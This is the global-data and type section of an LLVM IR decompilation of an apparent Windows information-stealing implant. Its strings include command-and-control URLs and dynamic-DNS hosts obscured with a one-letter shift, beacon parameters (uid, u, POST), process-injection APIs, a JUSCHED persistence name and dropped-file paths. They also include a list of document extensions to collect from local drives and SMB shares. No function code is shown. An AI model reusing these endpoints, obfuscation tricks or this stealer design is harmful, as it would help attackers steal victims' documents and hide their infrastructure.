source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%0 = type { i32, i32, i32, i32 }
%1 = type { i32, i32, i32, i32 }
%2 = type { i32, i32, i32, i32 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%vtable_1002c3b4_type = type { i32 (i8)*, i32 ()* }
%vtable_1002c3cc_type = type { i32 (i8)*, i32 ()* }
%vtable_1002c434_type = type { i32 (i8)*, i32 ()* }
%vtable_1002c44c_type = type { i32 (i8)*, i32 ()*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)* }
%vtable_1002c474_type = type { i32 (i32)* }
%vtable_1002c4bc_type = type { i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i32, i32, i32)*, i32 (i32, i32, i32)*, i32 (i64, i32, i32)*, i32 (i32, i32)*, i32 (i8*, i64)*, i32 ()*, i32 (i32*)* }
%vtable_1002c4fc_type = type { i32 (i32)* }
%vtable_1002c504_type = type { i32 (i32)* }
%vtable_1002c558_type = type { i32 (i32)*, i32 ()* }
%vtable_1002c574_type = type { i32 (i32)*, i32 ()* }
%vtable_1002c58c_type = type { i32 (i32)*, i32 ()* }
%vtable_1002f5e0_type = type { i32 (i32)* }
%vtable_1002f5ec_type = type { i32 (i32)*, i32 ()* }
%vtable_10038ca4_type = type { i32 (i32)*, i32 ()* }
%__MIDL___MIDL_itf_mfobjects_0000_0008_0002 = type { %__MIDL___MIDL_itf_mfobjects_0000_0008_0001, [1 x i32] }
%__MIDL___MIDL_itf_mfobjects_0000_0008_0001 = type { i32, i32, i32, i16, i16, i32, i32, i32, i32, i32, i32 }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_SYSTEMTIME = type { i16, i16, i16, i16, i16, i16, i16, i16 }
%tagRECT = type { i32, i32, i32, i32 }
%_IO_FILE = type { i32 }
%tagINPUT = type { i32, i32 }
%tagRAWINPUTDEVICELIST = type { i32*, i32 }
%addrinfo = type { i32, i32, i32, i32, i32, i8*, %sockaddr*, %addrinfo* }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%tagWNDCLASSW = type { i32, i32 (i32*, i32, i32, i32)*, i32, i32, i32*, i32*, i32*, i32*, i16*, i16* }
%_OSVERSIONINFOW = type { i32, i32, i32, i32, i32, [128 x i16] }
%_WIN32_FIND_DATAW = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i16], [14 x i16], i32, i32, i16 }
%_FILETIME = type { i32, i32 }
%_STARTUPINFOW = type { i32, i16*, i16*, i16*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_PROCESS_INFORMATION = type { i32*, i32*, i32, i32 }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_TOKEN_PRIVILEGES = type { i32, [1 x %_LUID_AND_ATTRIBUTES] }
%_LUID_AND_ATTRIBUTES = type { %_LUID, i32 }
%_LUID = type { i32, i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%_WIN32_FIND_DATAA = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i8], [14 x i8], i32, i32, i16 }
%__locale_struct = type { [13 x %__locale_data*], i16*, i32*, i32*, [13 x i8*] }
%__locale_data = type { i32 }
%_cpinfo = type { i32, [1 x i8], [1 x i8] }
%_TYPEDEF_fenv_t = type { i16, i16, i16, i16, i16, i16, i32, i16, i32, i32, i32, i16, i16, i32 }
%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }

@0 = external local_unnamed_addr global i32
@1 = external local_unnamed_addr global i32
@2 = external local_unnamed_addr global i32
@3 = external local_unnamed_addr global i32
@global_var_10040a4c = global i32 0
@global_var_10040a5c = local_unnamed_addr global i32 0
@global_var_10040a60 = local_unnamed_addr global i32 0
@global_var_1003df99 = local_unnamed_addr global i32 0
@global_var_10040a68 = global i32 0
@global_var_10038cb0 = constant i32 268439888
@global_var_10038bd4 = constant [18 x i8] c"Unknown exception\00"
@global_var_1002c3c0 = constant i32 268440160
@global_var_10038be8 = constant [9 x i8] c"bad cast\00"
@global_var_1003d084 = local_unnamed_addr global i32 -1153374642
@global_var_10038bf4 = constant [16 x i8] c"bad locale name\00"
@global_var_1003ace4 = local_unnamed_addr constant i32 0
@global_var_1002c3d8 = constant i32 268440800
@global_var_1002c3e8 = constant i32 268441664
@global_var_1002c418 = constant i32 268441760
@global_var_10038c08 = constant [3 x i8] c": \00"
@global_var_1002c440 = constant i32 268442560
@global_var_10038c0c = constant [9 x i8] c"iostream\00"
@global_var_10038c18 = constant [22 x i8] c"iostream stream error\00"
@global_var_1002c468 = constant i32 268442560
@global_var_10038c30 = constant [21 x i8] c"ios_base::badbit set\00"
@global_var_1003ada4 = constant i32 0
@global_var_10038c48 = constant [22 x i8] c"ios_base::failbit set\00"
@global_var_10038c60 = constant [21 x i8] c"ios_base::eofbit set\00"
@global_var_1003ed24 = local_unnamed_addr global i32 0
@global_var_100381dc = constant [11 x i16] %wide-string
@global_var_1003ff48 = global i32 0
@global_var_1003ff4c = local_unnamed_addr global i32 0
@global_var_1003ff50 = local_unnamed_addr global i32 0
@global_var_1003ff54 = local_unnamed_addr global i32 0
@global_var_1003ed20 = local_unnamed_addr global i32 0
@global_var_100381bc = constant [14 x i8] c"GetWindowRect\00"
@global_var_100381cc = local_unnamed_addr constant [16 x i8] c"GdiplusShutdown\00"
@global_var_1003ff52 = local_unnamed_addr global i32 0
@global_var_10039010 = local_unnamed_addr constant [177 x i8] c"GetForegroundWinInternetCheckConWriteProcessMemoContent-Type: aphttps://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_1003ff58 = local_unnamed_addr global i32 0
@global_var_1003ff5c = local_unnamed_addr global i32 0
@global_var_1003ff60 = local_unnamed_addr global i32 0
@global_var_1004003c = local_unnamed_addr global i32 0
@global_var_10039090 = local_unnamed_addr constant [49 x i8] c"GetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10038d10 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_1003d9c0 = local_unnamed_addr global i32 -1
@global_var_10040038 = global i32 0
@global_var_10040044 = local_unnamed_addr global i32 0
@global_var_1003f528 = local_unnamed_addr global i32 0
@global_var_1003d9c4 = global i32 65279
@global_var_100381f8 = constant [40 x i16] %wide-string
@global_var_1003ed2a = global i32 0
@global_var_100034f8 = local_unnamed_addr constant i32 268447253
@global_var_100381f4 = constant i32 32
@global_var_10038d00 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10038248 = constant i32 43
@global_var_1003824c = constant i32 45
@global_var_10038250 = constant i32 48
@global_var_10038254 = constant i32 49
@global_var_10038258 = constant i32 50
@global_var_1003825c = constant i32 51
@global_var_10038260 = constant i32 52
@global_var_10038264 = constant i32 53
@global_var_10038268 = constant i32 54
@global_var_1003826c = constant i32 55
@global_var_10038270 = constant i32 56
@global_var_10038274 = constant i32 57
@global_var_10038278 = constant i32 42
@global_var_1003827c = constant i32 43
@global_var_10038280 = constant i32 45
@global_var_10038284 = constant i32 46
@global_var_10038288 = constant i32 47
@global_var_10040040 = global i32 0
@global_var_1003828c = constant [13 x i8] c"kernel32.dll\00"
@global_var_1003829c = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_100382ac = constant i32 0
@global_var_1003f52c = local_unnamed_addr global i32 0
@global_var_100384b4 = constant [8 x i8] c"APPDATA\00"
@global_var_100384c8 = constant i32 100
@global_var_100384cc = constant i32 101
@global_var_100384d0 = constant i32 102
@global_var_100384d4 = constant i32 103
@global_var_100384d8 = constant i32 104
@global_var_100384dc = constant i32 105
@global_var_100384e0 = constant i32 106
@global_var_100384e4 = constant i32 107
@global_var_100384e8 = constant [35 x i8] c":\5CSystem Volume Information\5Cconfig\00"
@global_var_100384b0 = constant [3 x i8] c"rb\00"
@global_var_10038c78 = constant [16 x i8] c"string too long\00"
@global_var_10038c88 = constant [24 x i8] c"invalid string position\00"
@global_var_1003e078 = local_unnamed_addr global i32 0
@global_var_10040a70 = local_unnamed_addr global i32 0
@global_var_1003e05c = local_unnamed_addr global i32 0
@global_var_1003ad50 = constant i32 0
@global_var_1003e598 = local_unnamed_addr global i32 0
@global_var_10040a78 = global i32 0
@global_var_10040a7c = local_unnamed_addr global i32 0
@global_var_100384bc = constant [10 x i8] c"\5Ccoco.exe\00"
@global_var_10040960 = local_unnamed_addr global i32 0
@global_var_10038510 = local_unnamed_addr constant [21 x i8] c"SetHandleInformation\00"
@global_var_1004096c = local_unnamed_addr global i32 0
@global_var_1004094c = local_unnamed_addr global i32 0
@global_var_10040a1c = global i32 0
@global_var_10040a0c = local_unnamed_addr global i32 0
@global_var_10040a04 = local_unnamed_addr global i32 0
@global_var_1003852c = constant [13 x i8] c"GetTempPathA\00"
@global_var_1003853c = constant [4 x i8] c"%d\0A\00"
@global_var_1003d9f4 = global [13 x i8] c"lfsofm43/emm\00"
@global_var_1003d9f8 = local_unnamed_addr global [9 x i8] c"fm43/emm\00"
@global_var_1003d9fc = local_unnamed_addr global [5 x i8] c"/emm\00"
@global_var_1003da00 = local_unnamed_addr global i32 0
@global_var_100390a0 = local_unnamed_addr constant [33 x i8] c"GetConsoleWindowapplication/x-ww\00"
@global_var_10040964 = local_unnamed_addr global i32 0
@global_var_10038540 = constant [5 x i8] c"%02x\00"
@global_var_10038548 = constant [5 x i8] c"%02x\00"
@global_var_10038550 = constant [10 x i8] c"HeapAlloc\00"
@global_var_10039060 = local_unnamed_addr constant [97 x i8] c"net/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10040a08 = local_unnamed_addr global i32 0
@global_var_1003856c = constant [8 x i8] c"appdata\00"
@global_var_10038574 = constant [32 x i8] c"\5CMicrosoft\5CTemplates\5Cmsvcrt.dll\00"
@global_var_1003859c = local_unnamed_addr constant [6 x i8] c"dfgfg\00"
@global_var_10038594 = local_unnamed_addr constant [14 x i8] c"asdfg.asdfgfg\00"
@global_var_100385a0 = local_unnamed_addr constant i32 103
@global_var_10039070 = local_unnamed_addr constant [81 x i8] c"OU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_100385a4 = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_100385b4 = constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_1003d9d8 = constant [23 x i8] c"ouemm/emm!!!!!!!!!!!!!\00"
@global_var_1003d9c8 = constant [13 x i8] c"bewbqj43/emm\00"
@global_var_100409d4 = global i32 0
@global_var_100409d8 = local_unnamed_addr global i32 0
@global_var_100409dc = local_unnamed_addr global i32 0
@global_var_100409e0 = local_unnamed_addr global i32 0
@global_var_10040974 = local_unnamed_addr global i32 0
@global_var_10040978 = local_unnamed_addr global i32 0
@global_var_1004097c = local_unnamed_addr global i32 0
@global_var_10040980 = local_unnamed_addr global i32 0
@global_var_100385c4 = constant [14 x i8] c"SfhPqfoLfzFyX\00"
@global_var_100385d4 = constant [15 x i8] c"SfhTfuWbmvfFyX\00"
@global_var_100385e4 = constant [8 x i8] c"JUSCHED\00"
@global_var_100385ec = constant [8 x i16] %wide-string
@global_var_10040954 = local_unnamed_addr global i32 0
@global_var_100409fc = local_unnamed_addr global i32 0
@global_var_100385fc = constant [5 x i8] c"uid=\00"
@global_var_10038604 = local_unnamed_addr constant [4 x i8] c"&u=\00"
@global_var_10038608 = constant [13 x i8] c"GetUserNameW\00"
@global_var_10038618 = constant [5 x i8] c"%04x\00"
@global_var_10038620 = constant [5 x i8] c"UNIC\00"
@global_var_10038628 = constant [5 x i8] c"%04x\00"
@global_var_10038630 = local_unnamed_addr constant [5 x i8] c"UNIC\00"
@global_var_10038638 = constant i32 63
@global_var_10038568 = constant [4 x i8] c"%d\0A\00"
@global_var_10038d20 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10038644 = constant [50 x i8] c"iuuq;00xxx/xfcstt/dpn0dsfbufgffe/qiq@gffeje>5:423\00"
@global_var_10038678 = constant [39 x i8] c"iuuq;00gffe54/dpn04744314394148136/ynm\00"
@global_var_100386a0 = constant [54 x i8] c"iuuqt;00bteg589/xpseqsftt/dpn031280130240ij.fwfszpof0\00"
@global_var_100386d8 = constant [70 x i8] c"iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0efwpolfbsot0zushgws0nbtufs0ynm/ynm!\00"
@global_var_10038720 = constant [21 x i8] c"di1jdf/dsbcebodf/dpn\00"
@global_var_10038738 = constant [25 x i8] c"di11tf/dijdlfoljmmfs/dpn\00"
@global_var_10038ff0 = local_unnamed_addr constant [209 x i8] c"VtfsBhfou;Np{jmmInternetCloseHanGetForegroundWinInternetCheckConWriteProcessMemoContent-Type: aphttps://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10038d30 = local_unnamed_addr constant [16 x i8] c"wininet.dll    \00"
@global_var_10040a18 = local_unnamed_addr global i32 0
@global_var_10040968 = local_unnamed_addr global i32 0
@global_var_10040948 = local_unnamed_addr global i32 0
@global_var_10039000 = local_unnamed_addr constant [193 x i8] c"InternetCloseHanGetForegroundWinInternetCheckConWriteProcessMemoContent-Type: aphttps://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10040a00 = local_unnamed_addr global i32 0
@global_var_10040958 = local_unnamed_addr global i32 0
@global_var_100409d0 = local_unnamed_addr global i32 0
@global_var_10040998 = local_unnamed_addr global i32 0
@global_var_10039020 = local_unnamed_addr constant [161 x i8] c"InternetCheckConWriteProcessMemoContent-Type: aphttps://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10040a14 = local_unnamed_addr global i32 0
@global_var_10040a10 = local_unnamed_addr global i32 0
@global_var_10039040 = local_unnamed_addr constant [129 x i8] c"Content-Type: aphttps://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10038da0 = local_unnamed_addr constant [16 x i8] c"form-urlencoded\00"
@global_var_100409a0 = local_unnamed_addr global i32 0
@global_var_10039050 = local_unnamed_addr constant [113 x i8] c"https://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_1004095c = local_unnamed_addr global i32 0
@global_var_10038754 = constant [3 x i8] c"ok\00"
@global_var_1003876c = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_10038764 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_10038770 = local_unnamed_addr constant i32 0
@global_var_10038774 = local_unnamed_addr constant [15 x i8] c"CreateProcessA\00"
@global_var_10038784 = local_unnamed_addr constant [24 x i8] c"GetEnvironmentVariableA\00"
@global_var_10039030 = local_unnamed_addr constant [145 x i8] c"WriteProcessMemoContent-Type: aphttps://en.wikipnet/search.php?qOU!7/2<XPX75*Bqqd\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_1003879c = constant [8 x i8] c"appdata\00"
@global_var_100387a4 = local_unnamed_addr constant [17 x i8] c"SetThreadContext\00"
@global_var_100387c0 = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_100387b8 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_100387c4 = local_unnamed_addr constant i32 0
@global_var_100387c8 = constant [12 x i8] c"FreeLibrary\00"
@global_var_100387d4 = constant [19 x i16] %wide-string
@global_var_10038758 = constant [5 x i16] %wide-string
@global_var_10038818 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10038828 = constant [3 x i8] c"{{\00"
@global_var_1003882c = constant [3 x i8] c"}}\00"
@global_var_10038830 = constant [8 x i8] c"http://\00"
@global_var_10038838 = constant [9 x i8] c"https://\00"
@global_var_100390b0 = local_unnamed_addr constant [17 x i8] c"application/x-ww\00"
@global_var_10039080 = local_unnamed_addr constant [65 x i8] c"d\0D\0AContent-LengtGetKeyboardLayouGetConsoleWindowapplication/x-ww\00"
@global_var_10038844 = constant [8 x i8] c"http://\00"
@global_var_1003884c = constant [9 x i8] c"https://\00"
@global_var_10038858 = constant [5 x i8] c"&r=1\00"
@global_var_10038860 = constant [14 x i8] c"404 Not Found\00"
@global_var_10038870 = constant [3 x i8] c"{{\00"
@global_var_10038874 = constant [3 x i8] c"}}\00"
@global_var_10038878 = constant [8 x i8] c"http://\00"
@global_var_10038880 = constant [9 x i8] c"https://\00"
@global_var_1003888c = constant [10 x i8] c"WriteFile\00"
@global_var_10038898 = constant [12 x i8] c"CreateFileW\00"
@global_var_100388a4 = constant [3 x i8] c"||\00"
@global_var_100388a8 = constant [4 x i8] c"&yy\00"
@global_var_100388ac = constant [3 x i8] c"=1\00"
@global_var_100388b0 = constant [4 x i8] c"&tt\00"
@global_var_100388b4 = constant [4 x i8] c"&tt\00"
@global_var_100388b8 = constant i32 61
@global_var_100388bc = constant [4 x i8] c"&zz\00"
@global_var_100388c0 = constant [3 x i8] c"=1\00"
@global_var_100389fc = constant [9 x i8] c"TY10.dat\00"
@global_var_10038a08 = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_10038a18 = constant [3 x i16] %wide-string
@global_var_100409a4 = local_unnamed_addr global i32 0
@global_var_10040950 = local_unnamed_addr global i32 0
@global_var_10038a28 = local_unnamed_addr constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_10038a2c = local_unnamed_addr constant [9 x i8] c"0001.dat\00"
@global_var_10038a30 = local_unnamed_addr constant [5 x i8] c".dat\00"
@global_var_10038a38 = local_unnamed_addr constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_10038a3c = local_unnamed_addr constant [9 x i8] c"0001.dat\00"
@global_var_10038a40 = local_unnamed_addr constant [5 x i8] c".dat\00"
@global_var_10038a20 = constant [6 x i8] c"POST \00"
@global_var_10038a48 = local_unnamed_addr constant [5 x i8] c"&r=1\00"
@global_var_10038a50 = constant [13 x i8] c"kernel32.dll\00"
@global_var_10038a60 = constant [8 x i8] c"dpoofdu\00"
@global_var_10038a68 = constant [8 x i8] c"connect\00"
@global_var_10038a8c = constant [3 x i8] c"\5C*\00"
@global_var_10038a90 = constant i32 92
@global_var_10038a94 = constant i32 92
@global_var_10038a98 = constant [5 x i8] c".pdf\00"
@global_var_10038aa0 = constant [5 x i8] c".doc\00"
@global_var_10038aa8 = constant [6 x i8] c".docx\00"
@global_var_10038ab0 = constant [5 x i8] c".ppt\00"
@global_var_10038ab8 = constant [6 x i8] c".pptx\00"
@global_var_10038ac0 = constant [5 x i8] c".txt\00"
@global_var_10038ac8 = constant i32 92
@global_var_10038acc = constant i32 48
@global_var_10038ad0 = constant [6 x i8] c"HUGE:\00"
@global_var_10038ad8 = constant i32 92
@global_var_10038adc = constant [21 x i8] c"::size crosses 10 MB\00"
@global_var_10038cb8 = constant [63 x i8] c"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\00"
@global_var_10038af4 = constant [14 x i8] c"TZ0000002.dat\00"
@global_var_10038b04 = constant [5 x i8] c".pdf\00"
@global_var_10038b0c = constant [5 x i8] c".doc\00"
@global_var_10038b14 = constant [6 x i8] c".docx\00"
@global_var_10038b1c = constant [5 x i8] c".ppt\00"
@global_var_10038b24 = constant [6 x i8] c".pptx\00"
@global_var_10038b2c = constant [5 x i8] c".txt\00"
@global_var_10038b34 = constant [5 x i8] c"SMB\5C\00"
@global_var_10038b3c = constant [4 x i8] c"C:\5C\00"
@global_var_10038b40 = local_unnamed_addr constant [9 x i8] c"\5CMUT.dat\00"
@global_var_10038b4c = local_unnamed_addr constant [15 x i8] c"\5CTZ0000002.dat\00"
@global_var_10040a20 = local_unnamed_addr global i32 0
@global_var_10038b5c = constant [13 x i8] c"CreateThread\00"
@global_var_10038b6c = constant [34 x i8] c"GetVolumeNameForVolumeMountPointA\00"
@global_var_10038b90 = constant [13 x i8] c"kernel32.dll\00"
@global_var_10038ba0 = constant [3 x i8] c"\5C*\00"
@global_var_10038ba4 = constant [6 x i8] c"SMB\5C*\00"
@global_var_10038bac = constant [8 x i8] c"MUT.dat\00"
@global_var_10038bb4 = constant [14 x i8] c"TZ0000001.dat\00"
@global_var_10038bc4 = constant [14 x i8] c"TZ0000002.dat\00"
@global_var_1003e064 = local_unnamed_addr global i32 0
@global_var_1002f58c = constant i32 268495520
@global_var_1002f590 = constant [33 x i16] %wide-string
@global_var_1002d098 = constant [13 x i16] %wide-string
@global_var_1002d2d8 = constant [28 x i8] c"InitializeConditionVariable\00"
@global_var_1002d328 = constant [25 x i8] c"SleepConditionVariableCS\00"
@global_var_1002d30c = constant [25 x i8] c"WakeAllConditionVariable\00"
@global_var_1003e244 = local_unnamed_addr global i32 0
@global_var_1003e240 = global i32 0
@global_var_1003e248 = local_unnamed_addr global i32 0
@global_var_1003e24c = local_unnamed_addr global i32 0
@global_var_1003e574 = global i32 0
@global_var_1003e580 = global i32 0
@global_var_1003a560 = constant i32 -2
@global_var_1003e56c = local_unnamed_addr global i32 0
@global_var_1002c37c = constant i32 0
@global_var_1002c360 = constant i32 0
@global_var_1002c35c = constant i32 0
@global_var_1002c32c = constant i32 0
@global_var_1003e590 = local_unnamed_addr global i32 0
@global_var_1003a580 = constant i32 -2
@global_var_1003e594 = local_unnamed_addr global i32 0
@global_var_1003e59c = local_unnamed_addr global i32 0
@global_var_1003d090 = local_unnamed_addr global i32 1
@global_var_1003e5a0 = local_unnamed_addr global i32 0
@global_var_10040a8c = local_unnamed_addr global i32 0
@global_var_1003e5a8 = global i32 0
@global_var_1003e5b0 = global i32 0
@global_var_10040a88 = global i32 0
@global_var_1003e604 = local_unnamed_addr global i32 0
@global_var_1002f64c = external constant i32
@global_var_1002f658 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_1002f694 = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_1002f6d0 = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_1002f6e4 = constant [8 x i16] %wide-string
@global_var_1002f6f4 = constant [8 x i16] %wide-string
@global_var_1003e5c8 = global i32 0
@global_var_1002f70c = constant i32 0
@global_var_1002f704 = constant i32 0
@global_var_1002d0b4 = constant [9 x i8] c"FlsAlloc\00"
@global_var_1002f714 = constant i32 0
@global_var_1002d0c0 = constant [8 x i8] c"FlsFree\00"
@global_var_1002f71c = constant i32 0
@global_var_1002d0c8 = constant [12 x i8] c"FlsGetValue\00"
@global_var_1002d0d4 = constant [12 x i8] c"FlsSetValue\00"
@global_var_1002f72c = constant i32 0
@global_var_1002d0e0 = constant [28 x i8] c"InitializeCriticalSectionEx\00"
@global_var_1003e5dc = global i32 0
@global_var_1002c328 = local_unnamed_addr constant i32 268452064
@global_var_1003d0b0 = local_unnamed_addr global i32 429065504
@global_var_1003a738 = constant i32 -28
@global_var_1003e660 = local_unnamed_addr global i32 0
@global_var_1003e664 = local_unnamed_addr global i32 0
@global_var_1003e8e0 = global i32 0
@global_var_1003e8ec = global i32 0
@global_var_1002c398 = constant i32 0
@global_var_1002c388 = constant i32 0
@global_var_1002c3a0 = constant i32 0
@global_var_1002c39c = constant i32 0
@global_var_1003e9d0 = global i32 0
@global_var_1003a800 = constant i32 -2
@global_var_1003ebe0 = local_unnamed_addr global i32 0
@global_var_1003d3e8 = external global i32
@global_var_100303b8 = constant i32 2097184
@global_var_1003d330 = global i32* @global_var_100303b8
@global_var_1003d788 = global i32 0
@global_var_1003d3ec = local_unnamed_addr global i32* @global_var_1003d788
@global_var_1003e688 = global i32 0
@global_var_1003e7c0 = local_unnamed_addr global i32 0
@global_var_1002ff48 = constant i32 1
@global_var_1002ff4c = constant i32 22
@global_var_1003a860 = constant i32 -2
@global_var_1003e670 = local_unnamed_addr global i32 0
@global_var_1003e66c = local_unnamed_addr global i32 0
@global_var_1003a840 = constant i32 -2
@global_var_1003a8c8 = constant i32 -2
@global_var_1003a8e8 = constant i32 -2
@global_var_1003e674 = local_unnamed_addr global i32 0
@global_var_1003d2f0 = global i32 0
@global_var_1003a928 = constant i32 -2
@global_var_10030638 = constant i32 50462976
@global_var_100307b8 = constant i32 50462976
@global_var_1003ec00 = local_unnamed_addr global i32 0
@global_var_10031280 = local_unnamed_addr constant [4 x i8] c"pow\00"
@global_var_100322e0 = local_unnamed_addr constant i32 0
@global_var_1003ecec = local_unnamed_addr global i32 0
@global_var_1003ecf0 = local_unnamed_addr global i32 0
@global_var_1003e8d4 = local_unnamed_addr global i32 0
@global_var_1003a988 = constant i32 -2
@global_var_1003a9a8 = constant i32 -2
@global_var_1003d9a8 = local_unnamed_addr global i32* @global_var_1003d788
@global_var_1003ebd8 = local_unnamed_addr global i32 0
@global_var_1003ebdc = local_unnamed_addr global i32 0
@global_var_1003ecf4 = local_unnamed_addr global i32 0
@global_var_100313a8 = external constant i32
@global_var_100313f8 = local_unnamed_addr constant [35 x i16] %wide-string
@global_var_10031440 = local_unnamed_addr constant [32 x i16] %wide-string
@global_var_10031480 = local_unnamed_addr constant [28 x i16] %wide-string
@global_var_100314b8 = local_unnamed_addr constant [36 x i16] %wide-string
@global_var_10031500 = local_unnamed_addr constant [45 x i16] %wide-string
@global_var_10031560 = local_unnamed_addr constant [38 x i16] %wide-string
@global_var_100315ac = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_100315e8 = local_unnamed_addr constant [31 x i16] %wide-string
@global_var_10031628 = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_10031664 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_100316a0 = local_unnamed_addr constant [39 x i16] %wide-string
@global_var_100316f0 = local_unnamed_addr constant [43 x i16] %wide-string
@global_var_10031748 = local_unnamed_addr constant [43 x i16] %wide-string
@global_var_100317a0 = local_unnamed_addr constant [35 x i16] %wide-string
@global_var_100317e8 = local_unnamed_addr constant [39 x i16] %wide-string
@global_var_10031838 = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_1003184c = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_10031330 = constant i32 268542169
@global_var_1003e9c8 = local_unnamed_addr global i32 0
@global_var_1003a9c8 = constant i32 -2
@global_var_1003e8f8 = global i32 0
@global_var_10031860 = constant [16 x i8] c"AreFileApisANSI\00"
@global_var_1003185c = constant i32 18
@global_var_10031880 = constant [20 x i8] c"EnumSystemLocalesEx\00"
@global_var_10031878 = constant i32 4
@global_var_1002d414 = constant [16 x i8] c"GetLocaleInfoEx\00"
@global_var_100318cc = constant [25 x i8] c"GetUserDefaultLocaleName\00"
@global_var_100318f8 = constant [18 x i8] c"IsValidLocaleName\00"
@global_var_1003191c = constant [17 x i8] c"LCIDToLocaleName\00"
@global_var_1003190c = constant i32 4
@global_var_1002d424 = constant [14 x i8] c"LCMapStringEx\00"
@global_var_10031938 = constant [17 x i8] c"LocaleNameToLCID\00"
@global_var_10031930 = constant i32 4
@global_var_1003e9cc = local_unnamed_addr global i32 0
@global_var_100318b4 = constant i32 0
@global_var_1002d258 = constant [20 x i8] c"GetCurrentPackageId\00"
@global_var_1003aa68 = constant i32 -2
@global_var_1003aa88 = constant i32 -2
@global_var_1003aaa8 = constant i32 -2
@global_var_1003aa48 = constant i32 -2
@global_var_1003d320 = local_unnamed_addr global i32 -1
@global_var_1003ebe4 = global i32 0
@global_var_1003ab08 = constant i32 -2
@global_var_1003ab48 = constant i32 -2
@global_var_1003ab68 = constant i32 -2
@global_var_1003d170 = local_unnamed_addr global i32 46
@global_var_1003e678 = local_unnamed_addr global i32 0
@global_var_100300b2 = local_unnamed_addr constant i32 2097184
@global_var_1003d328 = local_unnamed_addr global i32 1
@global_var_1003ab28 = constant i32 -2
@global_var_10031af8 = constant [3 x i16] %wide-string
@global_var_100319bc = external constant i32
@global_var_10031a08 = local_unnamed_addr constant [11 x i16] %wide-string
@global_var_10031a64 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10031b00 = constant i32 59
@global_var_10031a78 = constant i32 67305985
@global_var_100300b4 = constant i32 2097184
@global_var_1003d324 = local_unnamed_addr global i32* @global_var_100300b4
@global_var_100319b8 = local_unnamed_addr constant i32 268557663
@global_var_1003ab88 = constant i32 -2
@global_var_1003ebe8 = local_unnamed_addr global i32 0
@global_var_1003ebec = local_unnamed_addr global i32 0
@global_var_1003abe8 = constant i32 -2
@global_var_1003ebf8 = local_unnamed_addr global i32 0
@global_var_1003abc8 = constant i32 -28
